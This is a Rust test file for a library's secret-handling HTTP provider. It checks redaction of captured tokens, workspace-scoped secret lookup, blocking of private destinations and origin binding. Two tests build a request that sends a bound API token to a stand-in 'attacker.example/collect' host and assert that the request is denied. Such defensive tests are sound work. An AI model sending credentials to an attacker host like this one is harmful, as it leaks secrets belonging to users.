use std::collections::BTreeMap;

use axum::{Json, Router, routing::post};
use ortyo::{
    execution::{
        ExecutionError, HttpExecutionProvider, HttpExecutionRequest, SecretCapture,
        SecretHeaderBinding,
    },
    secret::SecretStore,
};
use serde_json::json;
use tokio::net::TcpListener;
use uuid::Uuid;

#[tokio::test]
async fn captures_secret_and_redacts_evidence() {
    let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();
    tokio::spawn(async move {
        axum::serve(
            listener,
            Router::new().route(
                "/token",
                post(|| async {
                    Json(json!({
                        "workspace_id": "workspace-visible",
                        "credential": {"token": "ortyo_super_secret"}
                    }))
                }),
            ),
        )
        .await
        .unwrap();
    });

    let workspace_id = Uuid::now_v7();
    let provider = HttpExecutionProvider::new(SecretStore::default());
    let result = provider
        .execute_for_test(
            workspace_id,
            HttpExecutionRequest {
                method: "POST".to_owned(),
                url: format!("http://{addr}/token"),
                headers: BTreeMap::new(),
                body: Some(json!({"slug":"serhii"})),
                secret_headers: BTreeMap::new(),
                capture: vec![SecretCapture {
                    json_pointer: "/credential/token".to_owned(),
                    secret_name: "default-api-token".to_owned(),
                }],
                timeout_ms: 1000,
            },
        )
        .await
        .unwrap();

    assert_eq!(result.status, 200);
    assert_eq!(result.body["workspace_id"], "workspace-visible");
    assert_eq!(result.body["credential"]["token"], "[REDACTED]");
    assert_eq!(
        result.captured_secrets[0].secret_ref,
        "ortyo://secrets/default-api-token"
    );
    assert_eq!(
        result.captured_secrets[0].allowed_origin,
        format!("http://{addr}")
    );
    assert_eq!(
        provider
            .secret_store()
            .resolve(workspace_id, "default-api-token")
            .unwrap(),
        "ortyo_super_secret"
    );
    assert!(
        !serde_json::to_string(&result)
            .unwrap()
            .contains("ortyo_super_secret")
    );
}

#[tokio::test]
async fn rejects_private_destinations_in_production_path() {
    let provider = HttpExecutionProvider::new(SecretStore::default());
    let error = provider
        .execute(
            Uuid::now_v7(),
            HttpExecutionRequest {
                method: "GET".to_owned(),
                url: "http://127.0.0.1:8080/private".to_owned(),
                headers: BTreeMap::new(),
                body: None,
                secret_headers: BTreeMap::new(),
                capture: vec![],
                timeout_ms: 1000,
            },
        )
        .await
        .unwrap_err();
    assert_eq!(error, ExecutionError::UnsafeDestination);
}

#[tokio::test]
async fn resolves_secret_header_without_returning_secret() {
    let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();
    tokio::spawn(async move {
        axum::serve(
            listener,
            Router::new().route(
                "/authorized",
                post(|headers: axum::http::HeaderMap| async move {
                    let ok = headers
                        .get("authorization")
                        .and_then(|value| value.to_str().ok())
                        == Some("Bearer hidden");
                    Json(json!({"ok": ok}))
                }),
            ),
        )
        .await
        .unwrap();
    });

    let workspace_id = Uuid::now_v7();
    let secrets = SecretStore::default();
    secrets.put(workspace_id, "auth", "Bearer hidden").unwrap();
    let provider = HttpExecutionProvider::new(secrets);
    let mut secret_headers = BTreeMap::new();
    secret_headers.insert(
        "authorization".to_owned(),
        SecretHeaderBinding::SecretName("auth".to_owned()),
    );

    let result = provider
        .execute_for_test(
            workspace_id,
            HttpExecutionRequest {
                method: "POST".to_owned(),
                url: format!("http://{addr}/authorized"),
                headers: BTreeMap::new(),
                body: None,
                secret_headers,
                capture: vec![],
                timeout_ms: 1000,
            },
        )
        .await
        .unwrap();

    assert_eq!(result.body["ok"], true);
    assert!(!serde_json::to_string(&result).unwrap().contains("hidden"));
}

#[tokio::test]
async fn chains_secret_ref_into_bearer_header_without_exposing_value() {
    let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();
    tokio::spawn(async move {
        axum::serve(
            listener,
            Router::new().route(
                "/authorized",
                post(|headers: axum::http::HeaderMap| async move {
                    let ok = headers
                        .get("authorization")
                        .and_then(|value| value.to_str().ok())
                        == Some("Bearer chained-token");
                    Json(json!({"ok": ok}))
                }),
            ),
        )
        .await
        .unwrap();
    });

    let workspace_id = Uuid::now_v7();
    let secrets = SecretStore::default();
    secrets
        .put_bound(
            workspace_id,
            "default-api-token",
            "chained-token",
            format!("http://{addr}"),
        )
        .unwrap();
    let provider = HttpExecutionProvider::new(secrets);
    let mut secret_headers = BTreeMap::new();
    secret_headers.insert(
        "authorization".to_owned(),
        SecretHeaderBinding::SecretRef {
            secret_ref: "ortyo://secrets/default-api-token".to_owned(),
            prefix: "Bearer ".to_owned(),
            suffix: String::new(),
        },
    );

    let result = provider
        .execute_for_test(
            workspace_id,
            HttpExecutionRequest {
                method: "POST".to_owned(),
                url: format!("http://{addr}/authorized"),
                headers: BTreeMap::new(),
                body: None,
                secret_headers,
                capture: vec![],
                timeout_ms: 1000,
            },
        )
        .await
        .unwrap();

    assert_eq!(result.body["ok"], true);
    assert!(
        !serde_json::to_string(&result)
            .unwrap()
            .contains("chained-token")
    );
}

#[tokio::test]
async fn rejects_invalid_secret_ref() {
    let workspace_id = Uuid::now_v7();
    let secrets = SecretStore::default();
    secrets
        .put(workspace_id, "default-api-token", "hidden")
        .unwrap();
    let provider = HttpExecutionProvider::new(secrets);
    let mut secret_headers = BTreeMap::new();
    secret_headers.insert(
        "authorization".to_owned(),
        SecretHeaderBinding::SecretRef {
            secret_ref: "env://default-api-token".to_owned(),
            prefix: "Bearer ".to_owned(),
            suffix: String::new(),
        },
    );

    let error = provider
        .execute_for_test(
            workspace_id,
            HttpExecutionRequest {
                method: "GET".to_owned(),
                url: "http://127.0.0.1:9/unused".to_owned(),
                headers: BTreeMap::new(),
                body: None,
                secret_headers,
                capture: vec![],
                timeout_ms: 1000,
            },
        )
        .await
        .unwrap_err();

    assert_eq!(error, ExecutionError::InvalidRequest);
}

#[tokio::test]
async fn secret_ref_resolution_is_workspace_scoped() {
    let owner_workspace = Uuid::now_v7();
    let other_workspace = Uuid::now_v7();
    let secrets = SecretStore::default();
    secrets
        .put(owner_workspace, "default-api-token", "owner-token")
        .unwrap();
    let provider = HttpExecutionProvider::new(secrets);
    let mut secret_headers = BTreeMap::new();
    secret_headers.insert(
        "authorization".to_owned(),
        SecretHeaderBinding::SecretRef {
            secret_ref: "ortyo://secrets/default-api-token".to_owned(),
            prefix: "Bearer ".to_owned(),
            suffix: String::new(),
        },
    );

    let error = provider
        .execute_for_test(
            other_workspace,
            HttpExecutionRequest {
                method: "GET".to_owned(),
                url: "http://127.0.0.1:9/unused".to_owned(),
                headers: BTreeMap::new(),
                body: None,
                secret_headers,
                capture: vec![],
                timeout_ms: 1000,
            },
        )
        .await
        .unwrap_err();

    assert_eq!(error, ExecutionError::SecretNotFound);
}


#[tokio::test]
async fn typed_secret_ref_denies_a_different_origin_before_sending() {
    let workspace_id = Uuid::now_v7();
    let secrets = SecretStore::default();
    secrets
        .put_bound(
            workspace_id,
            "api-token",
            "must-not-leak",
            "https://api.example.com",
        )
        .unwrap();
    let provider = HttpExecutionProvider::new(secrets);
    let mut secret_headers = BTreeMap::new();
    secret_headers.insert(
        "authorization".to_owned(),
        SecretHeaderBinding::SecretRef {
            secret_ref: "ortyo://secrets/api-token".to_owned(),
            prefix: "Bearer ".to_owned(),
            suffix: String::new(),
        },
    );

    let error = provider
        .execute_for_test(
            workspace_id,
            HttpExecutionRequest {
                method: "GET".to_owned(),
                url: "https://attacker.example/collect".to_owned(),
                headers: BTreeMap::new(),
                body: None,
                secret_headers,
                capture: vec![],
                timeout_ms: 1000,
            },
        )
        .await
        .unwrap_err();

    assert_eq!(error, ExecutionError::SecretDestinationDenied);
}

#[tokio::test]
async fn legacy_secret_name_cannot_bypass_a_bound_origin_policy() {
    let workspace_id = Uuid::now_v7();
    let secrets = SecretStore::default();
    secrets
        .put_bound(
            workspace_id,
            "api-token",
            "must-not-leak",
            "https://api.example.com",
        )
        .unwrap();
    let provider = HttpExecutionProvider::new(secrets);
    let mut secret_headers = BTreeMap::new();
    secret_headers.insert(
        "authorization".to_owned(),
        SecretHeaderBinding::SecretName("api-token".to_owned()),
    );

    let error = provider
        .execute_for_test(
            workspace_id,
            HttpExecutionRequest {
                method: "GET".to_owned(),
                url: "https://attacker.example/collect".to_owned(),
                headers: BTreeMap::new(),
                body: None,
                secret_headers,
                capture: vec![],
                timeout_ms: 1000,
            },
        )
        .await
        .unwrap_err();

    assert_eq!(error, ExecutionError::SecretDestinationDenied);
}
